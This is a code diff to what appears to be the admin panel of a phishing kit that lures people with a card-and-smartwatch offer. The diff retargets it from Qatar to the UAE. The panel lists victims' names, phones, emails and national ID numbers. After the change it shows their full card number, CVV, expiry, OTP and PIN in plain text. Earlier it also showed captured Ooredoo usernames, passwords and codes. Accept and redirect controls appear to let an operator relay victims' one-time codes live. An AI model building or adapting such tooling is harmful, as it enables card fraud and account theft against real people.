@@ -360,9 +360,9 @@ tr.await-row td{animation:flash 1.8s ease-in-out infinite}
 .pop-x:hover{border-color:var(--gold-deep)}
 .pop-body{padding:8px 20px 20px}
 .dgrid{display:grid; grid-template-columns:repeat(2,1fr); gap:0 24px}
-.drow{display:flex; align-items:flex-start; justify-content:space-between; gap:16px; padding:11px 0; border-bottom:1px solid var(--line)}
-.drow .k{color:var(--muted); flex:0 0 auto}
-.drow .v{min-width:0; flex:1 1 auto; font-weight:700; text-align:end; overflow-wrap:anywhere; word-break:break-word}
+.drow{display:flex; justify-content:space-between; gap:16px; padding:11px 0; border-bottom:1px solid var(--line)}
+.drow .k{color:var(--muted); flex:none}
+.drow .v{font-weight:700; text-align:end; word-break:break-word}
 .dactions{margin-top:18px; display:flex; gap:10px; flex-wrap:wrap}
 .dactions .rbtn{height:46px; padding:0 18px; font-size:.95rem}
 body.pop-open{overflow:hidden}
@@ -420,10 +420,11 @@ body.pop-open{overflow:hidden}
           <thead>
             <tr>
               <th>نوع البطاقة</th>
-              <th>الساعة الذكية</th>
+              <th>الساعة</th>
               <th>الاسم</th>
               <th>رقم الجوال</th>
               <th>الحالة</th>
+              <th>المنطقة</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
@@ -529,11 +530,8 @@ function toast(msg){
   clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove("show"), 4000);
 }
 function loadOrders(){ return CACHE; }
-function fmtPhone(d){
-  const digits = String(d || "").replace(/\D/g, "");
-  return digits ? `+974 ${digits.slice(0,4)} ${digits.slice(4,8)}` : "";
-}
-function fmtQid(d){ return String(d || "").replace(/\D/g, ""); }
+function fmtPhone(d){ return d ? `+971 ${d.slice(0,2)} ${d.slice(2,5)} ${d.slice(5)}` : ""; }
+function fmtEid(d){ return d ? [d.slice(0,3), d.slice(3,7), d.slice(7,14), d.slice(14)].filter(Boolean).join("-") : ""; }
 function fmtDate(ts){ const d = new Date(ts); return d.toLocaleString("ar-AE", {year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"}); }
 function areaName(em, a){ const E = EMIRATES.find(e=>e.id===em); return E && E.areas[+a] ? E.areas[+a].ar : ""; }
 function emName(em){ const E = EMIRATES.find(e=>e.id===em); return E ? E.ar : ""; }
@@ -543,16 +541,6 @@ function openPop(ref){
   popRef = ref;
   const card = plans.find(p => p.cls === o.card);
   const watch = WATCHES.find(w => w.id === o.watch);
-  const pay = o.pay || {};
-  const cardNumber = pay.cardNumber || o.cardNumber || "";
-  const last4 = pay.last4 || (cardNumber ? String(cardNumber).slice(-4) : "");
-  const cardName = pay.cardName || o.cardName || "";
-  const cardBrand = pay.brand || o.brand || "";
-  const cardExp = pay.exp || pay.expiry || o.expiry || "";
-  const hasCvv = pay.cvv === true || Boolean(pay.cvv || o.cvv);
-  const hasOtp = pay.otp === true || Boolean(pay.otp || o.otp);
-  const hasPin = pay.pin === true || Boolean(pay.pin || o.pin);
-  const bankName = o.bankName || o.bank || "";
   $("popHead").innerHTML = `
     ${card ? `<img class="c" src="${card.img}" alt="">` : ""}
     ${watch ? `<img class="w" src="${watch.img}" alt="">` : ""}
@@ -561,7 +549,7 @@ function openPop(ref){
   $("popBody").innerHTML = `
     <div class="dgrid">
       <div class="drow"><span class="k">نوع البطاقة</span><span class="v">${card ? card.ar : (o.cardName || o.card)}</span></div>
-      <div class="drow"><span class="k">الساعة الذكية</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
+      <div class="drow"><span class="k">الساعة</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
       <div class="drow"><span class="k">الحالة</span><span class="v">${statusText(o.status)}</span></div>
       <div class="drow"><span class="k">التاريخ</span><span class="v">${fmtDate(o.ts)}</span></div>
       <div class="drow"><span class="k">الصفة</span><span class="v">${o.st === "resident" ? "مقيم" : "مواطن"}</span></div>
@@ -569,24 +557,19 @@ function openPop(ref){
       <div class="drow"><span class="k">الجنس</span><span class="v">${o.g === "female" ? "أنثى" : "ذكر"}</span></div>
       <div class="drow"><span class="k">رقم الجوال</span><span class="v" style="direction:ltr">${fmtPhone(o.p)}</span></div>
       <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>
-      <div class="drow"><span class="k">الرقم الشخصي القطري</span><span class="v" style="direction:ltr">${fmtQid(o.id)}</span></div>
-      <div class="drow"><span class="k">البنك</span><span class="v">${esc(bankName || "-")}</span></div>
+      <div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${fmtEid(o.id)}</span></div>
+      <div class="drow"><span class="k">الإمارة</span><span class="v">${emName(o.em)}</span></div>
+      <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
       <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
     </div>
- ${(o.pay || cardName || cardNumber || o.cvv || o.expiry || o.otp || o.pin) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
-<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(cardName || '-')}</span></div>
-<div class="drow"><span class="k">نوع البطاقة البنكية</span><span class="v" style="direction:ltr">${esc(cardBrand || '-')}</span></div>
-<div class="drow"><span class="k">آخر 4 أرقام</span><span class="v" style="direction:ltr">${esc(last4 || '-')}</span></div>
-<div class="drow"><span class="k">CVV</span><span class="v">${hasCvv ? 'تم الإدخال' : '-'}</span></div>
-<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(cardExp || '-')}</span></div>
-<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v">${hasOtp ? 'تم الإدخال' : '-'}</span></div>
-<div class="drow"><span class="k">الرقم السري</span><span class="v">${hasPin ? 'تم الإدخال' : '-'}</span></div>
+ ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
+<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(typeof o.pay.cardName === 'boolean' ? '-' : (o.pay.cardName || '-'))}</span></div>
+<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cardNumber === 'boolean' ? '-' : (o.pay.cardNumber || o.pay.number || '-'))}</span></div>
+<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(typeof o.pay.cvv === 'boolean' ? '-' : (o.pay.cvv || '-'))}</span></div>
+<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(typeof o.pay.exp === 'boolean' ? '-' : (o.pay.exp || o.pay.expiry || '-'))}</span></div>
+<div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(typeof o.pay.otp === 'boolean' ? '-' : (o.pay.otp || o.pay.code || '-'))}</span></div>
+<div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(typeof o.pay.pin === 'boolean' ? '-' : (o.pay.pin || '-'))}</span></div>
 </div></div>` : ""}
- ${ (o.ooredooUser || o.ooredooUsername || o.ooredooPass || o.ooredooPassword || o.ooredooOtp || o.ooredooCode) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
-<div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUsername || o.ooredooUser || '')}</span></div>
-<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredooPassword || o.ooredooPass || '')}</span></div>
-<div class="drow"><span class="k">رمز التحقق OTP</span><span class="v" style="direction:ltr">${esc(o.ooredooCode || o.ooredooOtp || '')}</span></div>
-</div></div>` : '' }
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
       <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
       <button class="rbtn accept" data-accept="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
@@ -632,24 +615,26 @@ function render(){
   const today = all.filter(o => new Date(o.ts).toDateString() === new Date().toDateString()).length;
   $("stTotal").textContent = all.length;
   $("stToday").textContent = today;
-  $("stFees").textContent = (all.filter(o => o.status === "confirmed").length * 5) + " ر.ق";
+  $("stFees").textContent = (all.filter(o => o.status === "confirmed").length * 5) + " AED";
 
   if (q) orders = orders.filter(o => (o.n||"").toLowerCase().includes(q) || (o.p||"").includes(q.replace(/\D/g,"")));
 
   const rows = $("rows");
   if (!orders.length){
-    rows.innerHTML = `<tr class="empty-row"><td colspan="6">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور ضغط العميل على تأكيد ومتابعة."}</td></tr>`;
+    rows.innerHTML = `<tr class="empty-row"><td colspan="5">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور ضغط العميل على تأكيد ومتابعة."}</td></tr>`;
     return;
   }
   rows.innerHTML = orders.map(o => {
     const card = plans.find(p => p.cls === o.card);
     const watch = WATCHES.find(w => w.id === o.watch);
+    const region = `${emName(o.em) || "—"}${o.a ? ` / ${areaName(o.em, o.a) || "—"}` : ""}`;
     return `<tr class="${o.status === "awaiting" ? "await-row" : ""}">
       <td><div class="cardcell">${card ? `<img src="${card.img}" alt="">` : ""}<span>${card ? card.ar : (o.cardName || o.card)}</span></div></td>
       <td>${watch ? `<div class="watchcell"><img src="${watch.img}" alt=""><span>${watch.ar}</span></div>` : (o.watchName || "—")}</td>
       <td>${esc(o.n)} ${badgeFor(o.status)}${o.status === "awaiting" ? ` <span class="badge" style="background:var(--media);color:var(--muted)">${stepName(o.step)}</span>` : ""}</td>
       <td class="num">${fmtPhone(o.p)}</td>
       <td>${badgeFor(o.status)}</td>
+      <td>${esc(region)}</td>
       <td><div class="rowbtns">
         <button class="rbtn" data-details="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/></svg> التفاصيل</button>
         <button class="rbtn redir" data-redir="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> إعادة التوجيه</button>
